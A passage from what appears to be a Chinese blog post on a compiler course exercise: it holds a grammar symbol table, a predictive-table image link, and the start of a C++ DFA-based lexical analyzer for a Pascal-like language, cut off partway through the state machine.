<td align="center"></td>
<td align="center">2</td>
<td align="center">if后的关系表达式</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">3</td>
<td align="center">then后的语句</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">4</td>
<td align="center">else后的语句</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">5</td>
<td align="center">子关系表达式</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">6</td>
<td align="center">算术表达式</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">7</td>
<td align="center">while语句</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">8</td>
<td align="center">while后的关系表达式</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">9</td>
<td align="center">do后的语句</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">10</td>
<td align="center">赋值语句</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">11</td>
<td align="center">赋值语句后的首个变量</td>
</tr>
</tbody></table>
</li>
</ol>
<h4 id="预测表-1"><a href="#预测表-1" class="headerlink" title="预测表"></a>预测表</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picturebed-1310517892.file.myqcloud.com/image-20230522215511189.png"
                      alt="image-20230522215511189"
                ></p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idMax 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> keyWordsLen 14</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wordsAnalyzer</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">char</span> wd;            <span class="comment">// 读取字符</span></span><br><span class="line">        <span class="type">int</span> silence;        <span class="comment">// 是否需要输出</span></span><br><span class="line">        <span class="type">int</span> len, status;    <span class="comment">// 缓存长度与自动机状态</span></span><br><span class="line">        <span class="type">int</span> flag;           <span class="comment">// 标记分析器是否正常</span></span><br><span class="line">        <span class="type">int</span> wordsLen;       <span class="comment">// 词元数量</span></span><br><span class="line">        <span class="type">int</span> type;           <span class="comment">// 种别归类: 0-关键字 1-运算符 2-常数 3-界符 4-标识符 5-注释串</span></span><br><span class="line">        <span class="type">int</span> cag;         <span class="comment">// 种别码, 保持为可查表位序+1</span></span><br><span class="line">        <span class="type">int</span> srcLen;     <span class="comment">// 源码长度</span></span><br><span class="line">        <span class="type">int</span> needOF;     <span class="comment">// 是否需要保存至文件</span></span><br><span class="line">        vector&lt;string&gt; strV;    <span class="comment">// 存储词元</span></span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; typeV;    <span class="comment">// 存储种别码</span></span><br><span class="line">        string words;       <span class="comment">// 缓存</span></span><br><span class="line">        string src;     <span class="comment">// 源码字符串</span></span><br><span class="line">        FILE *oF;    <span class="comment">// 结果保存文件，默认为fiP</span></span><br><span class="line">        string oFP;     <span class="comment">// 保存路径</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 词元编码表</span></span><br><span class="line">        vector&lt;string&gt; wordsTable = &#123;</span><br><span class="line">            <span class="string">&quot;program&quot;</span>, <span class="string">&quot;var&quot;</span>, <span class="string">&quot;integer&quot;</span>, <span class="string">&quot;real&quot;</span>,            <span class="comment">// 0-3</span></span><br><span class="line">            <span class="string">&quot;begin&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;if&quot;</span>, <span class="string">&quot;then&quot;</span>,                   <span class="comment">// 4-7</span></span><br><span class="line">            <span class="string">&quot;else&quot;</span>, <span class="string">&quot;while&quot;</span>, <span class="string">&quot;do&quot;</span>, <span class="string">&quot;repeat&quot;</span>,                <span class="comment">// 8-11</span></span><br><span class="line">            <span class="string">&quot;until&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                   <span class="comment">// 12-15（跳过14, 15）</span></span><br><span class="line">            <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                     <span class="comment">// 16-19（全跳过）</span></span><br><span class="line">            <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>,                             <span class="comment">// 20-23</span></span><br><span class="line">            <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&gt;=&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&lt;=&quot;</span>,                           <span class="comment">// 24-27</span></span><br><span class="line">            <span class="string">&quot;=&quot;</span>, <span class="string">&quot;&lt;&gt;&quot;</span>, <span class="string">&quot;:=&quot;</span>, <span class="string">&quot;&amp;&amp;&quot;</span>,                          <span class="comment">// 28-31</span></span><br><span class="line">            <span class="string">&quot;||&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                        <span class="comment">// 32-35（跳过34, 35）</span></span><br><span class="line">            <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                     <span class="comment">// 36-39（全跳过）</span></span><br><span class="line">            <span class="string">&quot;integerConst&quot;</span>, <span class="string">&quot;doubleConst&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,    <span class="comment">// 40-43（跳过42, 43）</span></span><br><span class="line">            <span class="string">&quot;id&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                      <span class="comment">// 44-47（跳过45, 47）</span></span><br><span class="line">            <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;.&quot;</span>,                         <span class="comment">// 48-51（跳过48, 49）</span></span><br><span class="line">            <span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>,                             <span class="comment">// 52-55</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 空白字符</span></span><br><span class="line">        <span class="type">const</span> vector&lt;<span class="type">char</span>&gt; filt = &#123;<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">        <span class="comment">// 单字分隔符,不考虑冒号,点号</span></span><br><span class="line">        <span class="type">const</span> vector&lt;<span class="type">char</span>&gt; delm = &#123;<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">wordsAnalyzer</span>(<span class="type">int</span> sil=<span class="number">0</span>, string fiP = <span class="string">&quot;./test.txt&quot;</span>, string foP = <span class="string">&quot;./res.txt&quot;</span>)&#123;</span><br><span class="line">            silence = sil;  </span><br><span class="line">            flag = <span class="number">1</span>;               <span class="comment">// 分析器状态ok</span></span><br><span class="line">            words = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">            status = <span class="number">0</span>;     <span class="comment">// 自动机起点</span></span><br><span class="line">            wordsLen = <span class="number">0</span>;   <span class="comment">// 词元数量</span></span><br><span class="line">            oFP = foP;      <span class="comment">// 保存路径</span></span><br><span class="line">            ifstream ins;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(oFP!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                needOF = <span class="number">1</span>;</span><br><span class="line">                oF = <span class="built_in">fopen</span>(oFP.<span class="built_in">c_str</span>(), <span class="string">&quot;w&quot;</span>);    <span class="comment">// 覆盖式的写入</span></span><br><span class="line">                <span class="keyword">if</span>(oF==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Fail to write in the file: %s&quot;</span>, oFP.<span class="built_in">c_str</span>());</span><br><span class="line">                    <span class="keyword">this</span>-&gt;flag = <span class="number">0</span>;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">newPrintf</span>(<span class="string">&quot;Output file path: %s -&gt; Succeed!\n&quot;</span>, oFP.<span class="built_in">c_str</span>());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> needOF = <span class="number">0</span>;    <span class="comment">// 不保存文件</span></span><br><span class="line">            ins.<span class="built_in">open</span>(fiP, ios::in);     <span class="comment">// 读入模式打开文件</span></span><br><span class="line">            <span class="keyword">if</span>(!ins.<span class="built_in">good</span>())&#123;    <span class="comment">// 检测文件是否正常打开</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Fail to open the file: %s&quot;</span>, fiP.<span class="built_in">c_str</span>());</span><br><span class="line">                <span class="keyword">this</span>-&gt;flag = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);       <span class="comment">// 出错, 终止程序</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;Input file path: %s -&gt; Succeed!\n&quot;</span>, fiP.<span class="built_in">c_str</span>());   <span class="comment">// 展示读取路径</span></span><br><span class="line">            <span class="built_in">printSplit</span>(<span class="string">&quot;Src&quot;</span>);  <span class="comment">// 分割线</span></span><br><span class="line">            </span><br><span class="line">            <span class="type">char</span> _ch;</span><br><span class="line">            src = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>((_ch = ins.<span class="built_in">get</span>()) != EOF)&#123;    <span class="comment">// 存入源码串中</span></span><br><span class="line">                src += _ch;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ins.<span class="built_in">close</span>();</span><br><span class="line">            src += <span class="string">&#x27;\0&#x27;</span>;    <span class="comment">// 添加终止符</span></span><br><span class="line">            srcLen = src.<span class="built_in">length</span>();  <span class="comment">// 源码串长度</span></span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;%s\n&quot;</span>, src.<span class="built_in">c_str</span>());    <span class="comment">// 展示源码</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ~<span class="built_in">wordsAnalyzer</span>()&#123;</span><br><span class="line">            <span class="built_in">fclose</span>(oF);     <span class="comment">// 关闭FILE文件流</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">analyze</span><span class="params">()</span></span>&#123;    <span class="comment">// 词法分析器</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;srcLen; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">447</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line">                &#125;</span><br><span class="line">                wd = src[i];</span><br><span class="line">                <span class="keyword">switch</span>(status)&#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0</span>:    <span class="comment">// 自动机起点，words为空</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isBlank</span>()) <span class="built_in">blankContinue</span>();   <span class="comment">// 跳过空白字符</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>()) <span class="built_in">newStatus</span>(<span class="number">1</span>);   <span class="comment">// 转移状态-&gt;1 字母开头 大写字母可以用于区分标识符和关键字，但即使全是小写字母也需要单独检查，因此全是字母归为一类</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">0</span>)) <span class="built_in">newStatus</span>(<span class="number">2</span>);                          <span class="comment">// 转移状态-&gt;2 非零数字开头</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;0&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">3</span>);                            <span class="comment">// 转移状态-&gt;3  0开头</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&amp;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">4</span>);         <span class="comment">// 转移状态-&gt;4  多字运算符</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;|&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">5</span>);         <span class="comment">// 转移状态-&gt;5  </span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;:&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">6</span>);         <span class="comment">// 转移状态-&gt;6</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&gt;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">7</span>);         <span class="comment">// 转移状态-&gt;7</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&lt;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">8</span>);         <span class="comment">// 转移状态-&gt;8</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">9</span>);         <span class="comment">// 转移状态-&gt;9</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">10</span>);        <span class="comment">// 状态转移-&gt;10 单字运算符</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">11</span>);        <span class="comment">// 状态转移-&gt;11 </span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;!&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">12</span>);        <span class="comment">// 状态转移-&gt;12 </span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;+&#x27;</span> || wd == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">13</span>);         <span class="comment">// 状态转移-&gt;13 加减号(正负号)</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;.&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">14</span>);        <span class="comment">// 状态转移-&gt;14 考虑.5 == 0.5 ,此时.后必须有数字</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isDelimiter</span>())&#123;        <span class="comment">// 单字分界符直接给出结果</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">3</span>;</span><br><span class="line">                            <span class="built_in">output</span>();               <span class="comment">// 存储词元、输出、初始化</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> i = <span class="built_in">passError</span>(i);      <span class="comment">// 检测到非法字符如&quot;^#$&quot;等</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">1</span>:&#123;    <span class="comment">// 字母开头,全字母情况 可终止 -&gt; 标识符或关键字</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>()) <span class="built_in">newStatus</span>(<span class="number">1</span>);    <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>() || wd == <span class="string">&#x27;_&#x27;</span>)&#123;     <span class="comment">// 状态转移-&gt;17</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">17</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;       <span class="comment">// 处理缓存内容</span></span><br><span class="line">                            cag = <span class="built_in">isKeywords</span>();</span><br><span class="line">                            <span class="keyword">if</span>(cag) type = <span class="number">0</span>;   <span class="comment">// 是关键字</span></span><br><span class="line">                            <span class="keyword">else</span> type = <span class="number">4</span>;    <span class="comment">// 标识符</span></span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">2</span>:&#123;        <span class="comment">// 非零数字开头，可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd==<span class="string">&#x27;.&#x27;</span>)&#123;    <span class="comment">// 转移状态-&gt;18 十进制实数, 此时.后可以无内容</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">18</span>);   </span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;    <span class="comment">// 转移状态-&gt;19 科学计数法E</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123;      <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">2</span>);   </span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>() || wd == <span class="string">&#x27;\&#x27;&#x27;</span> || wd == <span class="string">&#x27;&quot;&#x27;</span>)&#123;     <span class="comment">// 十进制数后跟字母或引号铁铁出错</span></span><br><span class="line">                            i = <span class="built_in">passError</span>(i);   <span class="comment">// 出错处理</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;       <span class="comment">// 被视为整常数，重置缓存</span></span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">3</span>:&#123;    <span class="comment">// 0开头数字，可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;X&#x27;</span> || wd == <span class="string">&#x27;x&#x27;</span>)&#123;     <span class="comment">// 状态转移-&gt;20 十六进制X</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">20</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;b&#x27;</span> || wd == <span class="string">&#x27;B&#x27;</span>)&#123;    <span class="comment">// 状态转移-&gt;21 二进制数b</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">21</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">8</span>))&#123;   <span class="comment">// 状态转移-&gt;22 八进制数</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">22</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>() || wd == <span class="string">&#x27;\&#x27;&#x27;</span> || wd == <span class="string">&#x27;&quot;&#x27;</span>)&#123;     <span class="comment">// 十进制数后跟字母或引号铁铁出错</span></span><br><span class="line">                            i = <span class="built_in">passError</span>(i);   <span class="comment">// 出错处理</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;       <span class="comment">// 被视为整常数0</span></span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">4</span>:&#123;    <span class="comment">// 检查 &amp; 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;&amp;&#x27;</span>)&#123;  <span class="comment">// 与运算符</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">5</span>:&#123;    <span class="comment">// 检查 | 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;|&#x27;</span>)&#123;  <span class="comment">// 或运算符</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">6</span>:&#123;    <span class="comment">// 检查 : 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>)&#123;  <span class="comment">// 赋值号:=</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span>&#123;    <span class="comment">// 冒号:</span></span><br><span class="line">                            type = <span class="number">3</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">7</span>:&#123;    <span class="comment">// 检查 &gt; 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>)&#123;  <span class="comment">// &gt;=</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// &gt;</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">8</span>:&#123;    <span class="comment">// 检查 &lt; 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>)&#123;  <span class="comment">// &lt;=</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&gt;&#x27;</span>)&#123;   <span class="comment">// &lt;&gt;</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;    <span class="comment">// &lt;</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">9</span>:&#123;    <span class="comment">// 检查 / 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;23 单行注释符//</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">23</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>)&#123; <span class="comment">// 状态转移-&gt;24 多行注释符</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">24</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 除号/</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">10</span>:&#123;   <span class="comment">// 检查 *</span></span><br><span class="line">                        type = <span class="number">1</span>;</span><br><span class="line">                        <span class="built_in">output</span>();</span><br><span class="line">                        i -= <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">11</span>:&#123;   <span class="comment">// 检查 =</span></span><br><span class="line">                        type = <span class="number">1</span>;</span><br><span class="line">                        <span class="built_in">output</span>();</span><br><span class="line">                        i -= <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">12</span>:&#123;   <span class="comment">// 检查 !</span></span><br><span class="line">                        type = <span class="number">1</span>;</span><br><span class="line">                        <span class="built_in">output</span>();</span><br><span class="line">                        i -= <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">13</span>:&#123;   <span class="comment">// +-号 不完美的DFA 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(cag == <span class="number">41</span> || cag == <span class="number">42</span> || cag == <span class="number">45</span> || cag ==<span class="number">56</span> )&#123;     <span class="comment">// 前面出现操作数则为加减号, &#x27;(&#x27;被视为有效界符, &#x27;)&#x27; 则被视为操作数</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;.&#x27;</span>)&#123;         <span class="comment">// 状态转移-&gt;14 实数</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">14</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">0</span>))&#123;        <span class="comment">// 状态转移-&gt;2 非0数字</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">2</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;0&#x27;</span>)&#123;         <span class="comment">// 状态转移-&gt;3 数字0</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">3</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;   <span class="comment">// 加减号</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">14</span>:&#123;   <span class="comment">// . 实数 